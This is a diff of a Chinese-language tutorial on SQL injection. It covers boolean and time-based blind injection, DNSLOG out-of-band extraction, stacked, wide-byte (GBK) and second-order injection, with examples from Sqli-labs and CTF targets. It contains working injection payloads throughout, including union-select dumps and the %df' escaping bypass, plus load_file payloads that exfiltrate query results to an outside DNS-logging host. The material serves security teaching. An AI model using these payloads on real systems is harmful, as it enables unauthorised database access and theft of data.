@@ -368,7 +368,7 @@ multilinestring()
 
 在介绍布尔盲注的原理前，先来了解一下它用到的函数
 
-#### 常用函数
+##### 常用函数
 
 - `left()`函数：从左边截取指定长度的字符串
 
@@ -395,28 +395,283 @@ multilinestring()
   ascii(指定字符串)
   ```
 
-  \### 布尔盲注原理
+##### 布尔盲注原理
 
-布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断，这里我们用 Sqli-labs 第八关帮助大家理解它
+布尔（Boolean）是一种数据类型，通常是真和假两个值，进行布尔盲注入时我们实际上使用的是抽象的布尔概念，即通过页面返回正常（真）与不正常（假）判断。
 
-先添加参数`?id=1`
+##### 手工实现布尔盲注
 
-先用单引号判断类型，发现添加单引号后并没有报错，但是 You are in... 消失了，这里也就为我们判断创造了条件，**后面我们就需要观察 You are in... 是否出现，找不同情况**
+**1 .查看页面变化，判断sql注入类别**
 
-这里我们再添加一个单引号，发现 You are in... 出现，则本关为字符型注入，使用单引号包裹
-
-因为这里只会回显真或假，无法直接拿到数据库的名字，但是我们可以降低一点条件，可以**先判断出数据库名的长度（最长为 30），这里可以先给一个范围，观察一下回显（二分法）**
-
-```
-//先猜测数据库名是否比5长，发现为真
-1' and length(database())>5--+
-
-//再判断数据库是否比10长，发现为假
-1' and length(database())>10--+
-
-//此时数据库大于5小于等于10，依次尝试可以发现长度为8
-1' and length(database())=8--+
+```sql
+?id=1 and 1=1
+?id=1 and 1=2
+【字符型】
 ```
 
-拿到长度后，我们使用`substr()`函数或`mid()`函数一位一位的猜测数据库字符，Mysql 库名一共可以使用 63 个字符，分别是：`a-z`、`A-Z`、`0-9`、`_`
+**2.猜解数据库长度**
 
+使用length()判断数据库长度，二分法可提高效率
+
+```
+?id=1' and length(database())>5 --+
+?id=1' and length(database())<10 --+
+?id=1' and length(database())=8 --+
+【length=8】
+```
+
+**3.猜当前数据库名**
+
+方法1：使用`substr函数`
+
+```
+?id=1' and substr(database(),1,1)>'r'--+
+?id=1' and substr(database(),1,1)<'t'--+
+?id=1' and substr(database(),1,1)='s'--+
+?id=1' and substr(database(),2,1)='e'--+
+...
+?id=1' and substr(database(),8,1)='y'--+
+【security】
+```
+
+方法2：使用`ascii函数和substr函数`
+
+```
+?id=1' and ascii(substr(database(),1,1))>114 --+
+?id=1' and ascii(substr(database(),1,1))<116 --+
+?id=1' and ascii(substr(database(),1,1))=115 --+
+【security】
+```
+
+方法3：使用`left函数`
+
+```
+?id=1' and left(database(),1)>'r'--+
+?id=1' and left(database(),1)<'t'--+
+?id=1' and left(database(),1)='s' --+
+?id=1' and left(database(),2)='se' --+
+?id=1' and left(database(),3)='sec' --+
+...
+?id=1' and left(database(),8)='security' --+
+【security】
+```
+
+#### 基于时间的盲注
+
+时间盲注可以用在比布尔盲注过滤还要严格的环境中，当页面连真和假这个判断条件都不提供时，我们便可以让我们自己创造时间这一条件，当语句被执行时，便会产生延迟，反之则不会，我们先来看一下时间盲注的常用函数
+
+##### 常用函数
+
+`sleep()`函数：将程序执行的结果延迟返回 n 秒
+
+```
+sleep(n)
+```
+
+`if()`函数：参数1为条件，当参数 1 返回的结果为 true 时，执行参数 2，否则执行参数 3，有点像 Java 里的三元运算符
+
+```
+if(参数1，参数2，参数3)
+```
+
+##### 延时盲注原理
+
+延时盲注的实现本质上就是`if()`函数嵌套`sleep()`函数的综合利用，将`sleep()`函数作为`if()`函数的第二个参数，也就是当参数一被成功执行时（结果为 true）对返回结果执行延时，反之则执行参数三的直接回显
+
+##### 手工实现延时盲注
+
+```
+?id=1 
+?id=1'
+?id=1"
+#不管怎么样都不报错，不管对错一直显示一个固定的页面；
+
+#判断注入点
+?id=1' and sleep(3)--+
+#页面响应延迟，判断存在时间延迟型注入
+
+#获取数据库名长度
+?id=1' and if(length(database())=8,sleep(3),1)--+
+
+#获取数据库名
+?id=1' and if(substr(database(),1,1)='s',sleep(3),1)--+
+```
+
+### 基于 DNSLOG 的注入
+
+DNSLOG 是存储在 DNS 服务器上的域名信息，它记录着用户对域名的访问信息，类似日志文件。像是 SQL 盲注、命令执行、SSRF 及 XSS 等攻击但无法看到回显结果时，就会用到 DNSLOG 技术，相比布尔盲注和时间盲注，DNSLOG  减少了发送的请求数，可以直接回显，也就降低了被安全设备拦截的可能性
+
+DNSLOG 注入优点众多，但利用条件也较为严苛
+
+- 只支持 Windows 系统的服务端，因为要使用 UNC 路径这一特性，Linux 不具备此特性
+- Mysql 支持使用`load_file()`函数读取任意盘的文件
+
+#### UNC 路径
+
+UNC 全称 Universal Naming Convention，译为通用命名规范，例如我们在使用虚拟机的共享文件功能时，便会使用到 UNC 这一特性
+
+UNC 路径的格式如下：
+
+```
+\\192.168.0.1\test\
+```
+
+这里我们使用运行使用 UNC 路径访问[www.dnslog.cn](https://github.com/fish123123/fish123123.github.io/issues/www.dnslog.cn)，并使用 wireshark 抓包，可以看到确实存在对[www.dnslog.cn](https://github.com/fish123123/fish123123.github.io/issues/www.dnslog.cn)这个域名进行 DNS 请求的流量，但是并不会在浏览器直接打开网站
+
+#### load_file() 函数
+
+上文我们提到，`load_file()`函数可以读取**任意**盘的文件才可以使用 DNSLOG 注入，它的读取范围由 Mysql 配置文件`my.ini`中的`secure_file_priv`参数决定
+
+- 当`secure_file_priv`为空，就可以读取磁盘的目录
+- 当`secure_file_priv`为`G:\`，就可以读取G盘的文件
+- 当`secure_file_priv`为 null，`load_file()`函数就不能加载文件（null 和空是两种情况）
+
+#### DNSLOG 盲注原理
+
+先给出最常用的两种 Payload
+
+```
+Payload 1:
+and if((select load_file(concat('//',(select 攻击语句),'.xxxx.ceye.io/sql_test'))),1,0)
+
+Payload 2:
+and if((select load_file(concat('\\\\',(select 攻击语句),'.xxxx.ceye.io\\sql_test'))),1,0)
+```
+
+Payload 1,2 大体的思路都是一样的，也就是在`if()`函数中嵌套`load_file()`函数再使用 UNC 路径进行读取，`sql_test`这里写什么都可以，只是为了符合`load_file()`函数格式，读取时会产生 DNS 访问信息，唯一的不同点在于 Payload 2 在 URL 中使用`\(反斜杠)`时要双写配合转义
+
+> 转义：转义是一种引用单个字符的方法. 一个前面放上转义符 ()的字符就是告诉 shell 这个字符按照字面的意思进行解释
+
+这里还可以使用hex()函数，将回显内容编码为十六进制，这样做的好处是，假设回显内容存在特殊字符!@#$%^&，包含特殊字符的域名无法被解析，DNSLOG也就无法记录信息，进行编码后就不存在这个问题
+
+### 堆叠注入
+
+堆叠注入的基本原理是在一条 SQL 语句结束后（通常使用分号`;`标记结束），继续构造并执行下一条SQL语句，这种注入方法可以执行任意类型的语句，包括查询、插入、更新和删除等等
+
+与联合注入相比，**堆叠注入最明显的差别便是它的权限更大了**，例如使用联合注入时，后端使用的是 select 语句，那么我们注入时也只能执行 select 操作，而堆叠查询是一条新的 SQL 语句，不受上一句的语法限制，操作的权限也就更大了
+
+但相应的，堆叠注入的利用条件变得更加严格，例如在 Mysql 中，需要使用`mysqli_multi_query()`函数才可以进行多条 SQL 语句同时执行，同时还需要网站对堆叠注入无过滤，因此在实战中堆叠注入还是较为少见的。
+
+### 宽字节注入
+
+当某字符的大小为一个字节时，称其字符为窄字节，当某字符的大小为两个或更多字节时，称其字符为宽字节，而且不同的字符编码方式和字符集对字符的大小有不同的影响
+
+例如，在 ASCII 码中，一个英文字母（不分大小写）为一个字节，一个中文汉字为两个字节；在 UTF-8 编码中，一个英文字为一个字节，一个中文为三个字节；在 Unicode 编码中，一个英文为一个字节，一个中文为两个字节
+
+#### 敏感函数 & 选项
+
+- `addslashes()`函数：返回在预定义字符之前添加反斜杠的字符串
+- `magic_quotes_gpc`选项：对 POST、GET、Cookie 传入的数据进行转义处理，在输入数据的特殊字符如 单引号、双引号、反斜线、NULL等字符前加入转义字符`\`，在高版本 PHP 中（>=5.4.0）已经弃用
+- `mysql_real_escape_string()`函数：函数转义 SQL 语句中使用的字符串中的特殊字符
+- `mysql_escape_string()`函数：和`mysql_real_escape_string()`函数基本一致，差别在于不接受连接参数，也不管当前字符集设定
+
+#### 宽字节注入原理
+
+宽字节注入的本质是开发者设置**数据库编码与 PHP 编码为不同的编码格式从而导致产生宽字节注入**，例如当 Mysql 数据库使用 GBK 编码时，它会把两个字节的字符解析为一个汉字，而不是两个英文字符，这样，如果我们输入一些特殊的字符，就会形成 SQL 注入
+
+为了防止 SQL 注入，通常会使用一些 PHP 函数，如`addslashes()`函数，来对特殊字符进行转义（我们之前说过，转义就是在字符前加一个`\`），反斜杠用 URL 编码表示是`%5c`，所以如果我们输入单引号`’`，它会变成`%5c%27`，这样我们就无法闭合 SQL 语句了
+
+但是，如果我们输入`%df’`，它会变成`%df%5c%27`，这里，%df%5c是一个宽字节的GBK编码，它表示一个繁体字“運”
+
+因为 GBK 编码的第一个字节的范围是 129-254，而`%df`的十进制是 223，所以它属于 GBK 编码的第一个字节，而`%5c`的十进制是 92，它属于 GBK 编码的第二个字节的范围 64-254，所以，`%df%5c`被数据库解析为一个汉字，而不是两个英文字符。
+
+#### 手工注入
+
+```sql
+?id=1
+'''
+your sql:select id,title from news where id = '1'
+here is the information
+'''
+```
+
+输入1'可以看到'被变成了\',应该是addslashes之类的函数转义的结果。
+
+```sql
+?id=1'
+'''
+your sql:select id,title from news where id = '1\''
+here is the information    
+'''
+```
+
+用上文宽字节构造方法，构造id=1%df’或者id=1%aa’，成功报错
+
+```
+?id=1%df'
+或者【只要ASCII大于128的字符就可以】
+?id=1%aa'
+'''
+your sql:select id,title from news where id = '1ß\''
+Warning: mysql_fetch_array() expects parameter 1 to be resource, boolean given in SQL-GBK/index.php on line 10
+'''
+```
+
+确定字段数
+
+```
+?id=1%aa' order by 1 --+	正常
+?id=1%aa' order by 2 --+	正常
+?id=1%aa' order by 3 --+	报错
+'''
+所以字段数为2
+'''
+```
+
+确定显示位
+
+前面必须为-1【前面查出来的值为null，才能显示后面我们想要的信息】，后面的信息才能显示出来
+
+```
+?id=-1%aa' union select 1,2  --+
+'''
+your sql:select id,title from news where id = '-1歿'union select 1,2 -- '
+2
+'''
+```
+
+确定了回显的位置是2
+
+查询信息
+
+```
+#查询数据库
+?id=-1%aa' union select 1,database()  --+
+'''
+sae-chinalover
+'''
+    
+#查询表名
+?id=-1%aa' union select 1,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+'''
+ctf,ctf2,ctf3,ctf4,news
+'''  
+    
+#查询字段名
+?id=-1%aa' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x63746634 --+
+
+'''这里表名table_name的值必须转换成16进制，如果不用16进制就得用引号包裹，当有addlashes函数就会转义引号，就会导致查询失败，使用16进制避免了这个问题。
+id,flag
+'''
+#查询字段信息
+?id=-1%aa' union select 1,group_concat(id,0x3a,flag) from ctf4 --+
+'''
+1:flag{this_is_sqli_flag}
+'''
+    
+?id=-1%aa' union select 1,group_concat(content) from ctf2 --+     
+'''
+h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,h4cked_By_w00dPeck3r,the flag is:nctf{query_in_mysql},h4cked_By_w00dPeck3r    
+'''    
+```
+
+### 二次注入
+
+#### 二次注入原理
+
+这里假设有 A 和 B 两个注入点，**A 注入点因为存在过滤处理所以无法直接进行注入，但是会将我们输入的数据以原本的形式储存在数据库中（存入数据库时被还原了），在此情况下，我们找到注入点 B，使得后端调用存储在数据库中的恶意数据并执行 SQL 查询**，完成二次注入
+
+这也就引出了二次注入的两个步骤
+
+- 插入恶意数据：构造恶意语句并进行数据库插入数据时，虽对其中特殊字符进行了转义处理，但在写入数据库时仍保留了原来的数据
+- 调用恶意数据：开发者默认存入数据库的数据都是安全的，在进行调用时，直接使用恶意数据，没有进行二次校验
